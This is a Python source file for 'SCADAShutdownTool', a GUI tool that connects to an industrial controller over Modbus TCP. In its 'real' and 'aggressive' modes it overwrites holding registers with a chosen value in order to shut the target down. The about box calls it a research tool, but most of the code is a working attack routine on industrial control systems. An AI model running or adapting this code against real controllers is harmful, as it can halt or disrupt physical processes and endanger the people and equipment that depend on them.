import os
import sys
import time
import threading
from pymodbus.client.sync import ModbusTcpClient
import wx
import wx.richtext as rt
import gui
from wx.lib.wordwrap import wordwrap

### DEFAULT SETTINGS ###
default_ip = "7.7.7.50"
default_port = 502
default_unit_id = 1
default_sd_val = 1
default_co_offset = 50
default_di_offset = 50
default_ai_offset = 50
default_hr_offset = 50
default_er_offset = 50

###
### DO NOT EDIT PARAMETERS BELOW THIS LINE ###
###
RUNNING_MODE = "safe_mode"
error = 0
debug_mode = False

class RedirectText(object):
    def __init__(self,aWxTextCtrl):
         self.out=aWxTextCtrl
         self.writeLock = threading.RLock()

    def write(self,string):
        with self.writeLock:
            self.out.WriteText(string)


class onLoad(gui.MainFrame):
    def __init__(self,parent):
        
        global RUNNING_MODE
        gui.MainFrame.__init__(self,parent)        
        redir=RedirectText(self.console)
        sys.stdout=redir
        self.textAttr = rt.RichTextAttr()
        self.SetFontStyle(fontColor=wx.Colour(0, 0, 0), fontBgColor=wx.Colour(255, 255, 255), fontFace='Arial', fontSize=10, fontBold=False, fontItalic=False, fontUnderline=False)
        self.console.SelectAll()
        self.console.DeleteSelection()

        RUNNING_MODE = "real_mode"
        self.coil_outputs.SetValue(True)
        self.digital_inputs.SetValue(True)
        self.analogue_inputs.SetValue(True)
        self.holding_registers.SetValue(True)
        self.extended_registers.SetValue(True)

        self.ip.WriteText(str(default_ip))
        self.port.WriteText(str(default_port))
        self.unit_id.WriteText(str(default_unit_id))
        self.sd_val.WriteText(str(default_sd_val))

        self.co_offset.WriteText(str(default_co_offset))
        self.di_offset.WriteText(str(default_di_offset))
        self.ai_offset.WriteText(str(default_ai_offset))
        self.hr_offset.WriteText(str(default_hr_offset))
        self.er_offset.WriteText(str(default_er_offset))


    def start(self,event):
        global error
        self.console.SelectAll()
        self.console.DeleteSelection()

        print "[INFO] Starting Shuting down process!"
        self.sb.SetStatusText("Shuting down target, please wait...")

        if (self.safe_mode.GetValue() == True):
            RUNNING_MODE = "safe_mode"
        if (self.real_mode.GetValue() == True):
            RUNNING_MODE = "real_mode"
        if (self.aggressive_mode.GetValue() == True):
            RUNNING_MODE = "aggressive_mode"

        ip = self.ip.GetValue()
        sd_val = self.sd_val.GetValue()
        hr_offset = self.hr_offset.GetValue()
        client = ModbusTcpClient(ip)
        

        # Holding Registers
        if (self.holding_registers.GetValue() == True):
            i=0
            while i < default_hr_offset:
                try:
                    response = client.read_holding_registers(int(i),1)
                    hr = 40001 + int(i)
                    value =  response.registers[0]
                    if debug_mode == True:
                        print "40001 + ofset: "+str(i)
                    if value != 0:
                        print "Holding Register value: "+str(hr)+" :"+str(value)

                        if RUNNING_MODE == "real_mode":
                            client.write_register(int(i), int(sd_val))
                            response = client.read_holding_registers(int(i), int(sd_val))
                            if debug_mode == True:
                                print "Register value: "+str(response.registers[0])


                    if RUNNING_MODE == "aggressive_mode":
                        client.write_register(int(i), int(sd_val))
                        response = client.read_holding_registers(int(i), int(sd_val))
                        if debug_mode == True:
                            print "Register value: "+str(response.registers[0])                    
                except:
                    print "[ERROR] Unable to connect target controller!"
                    self.sb.SetStatusText("Unable to connect target controller!")
                    error = 1
                    break

                i+=1

        if error == 0:
            print "[INFO] Process completed successfully!"
            self.sb.SetStatusText("Process completed successfully!")
        
        client.close()


    def SetFontStyle(self, fontColor = None, fontBgColor = None, fontFace = None, fontSize = None,
                     fontBold = None, fontItalic = None, fontUnderline = None):
      if fontColor:
         self.textAttr.SetTextColour(fontColor)
      if fontBgColor:
         self.textAttr.SetBackgroundColour(fontBgColor)
      if fontFace:
         self.textAttr.SetFontFaceName(fontFace)
      if fontSize:
         self.textAttr.SetFontSize(fontSize)
      if fontBold != None:
         if fontBold:
            self.textAttr.SetFontWeight(wx.FONTWEIGHT_BOLD)
         else:
            self.textAttr.SetFontWeight(wx.FONTWEIGHT_NORMAL)
      if fontItalic != None:
         if fontItalic:
            self.textAttr.SetFontStyle(wx.FONTSTYLE_ITALIC)
         else:
            self.textAttr.SetFontStyle(wx.FONTSTYLE_NORMAL)
      if fontUnderline != None:
         if fontUnderline:
            self.textAttr.SetFontUnderlined(True)
         else:
            self.textAttr.SetFontUnderlined(False)
      self.console.SetDefaultStyle(self.textAttr)


    def aboutFunc(self, event):
        overview = "SCADAShutdownTool is an industrial control system automation and testing tool allows to test SCADA security systems, enumerate slave controllers, read controller registers values and rewrite data."
        licenseText = "This tool intended for research purposes only!\r\nIt is strongly recommended that you do not\r\nuse this tool for illegal purposes or in any production environment. \r\n\r\nWARNING:\r\n0xICF will not be responsible for any damage\r\nthat caused by using this tool."
        info = wx.AboutDialogInfo()
        info.Name = "SCADAShutdownTool"
        info.Version = "1.0 Beta"
        info.Copyright = "(C) 2015 0xICF"
        info.Description = wordwrap(overview,350, wx.ClientDC(self))
        info.WebSite = ("https://github.com/0xICF/SCADAShutdownTool", "SCADAShutdownTool home page")
        info.Developers = [ "BlackPian0", "F0x32o"]
        info.License = wordwrap(licenseText, 350, wx.ClientDC(self))

        wx.AboutBox(info)


    def exitFunc(self, event):
        sys.exit(0)


if __name__ == '__main__':
    try:
        app = wx.App(False)
        frame = onLoad(None)
        frame.Show(True)
        app.MainLoop()

    except:
        error = sys.exc_info()[0]
        print "Unable to start SCADAShutdownTool\t"+str(error)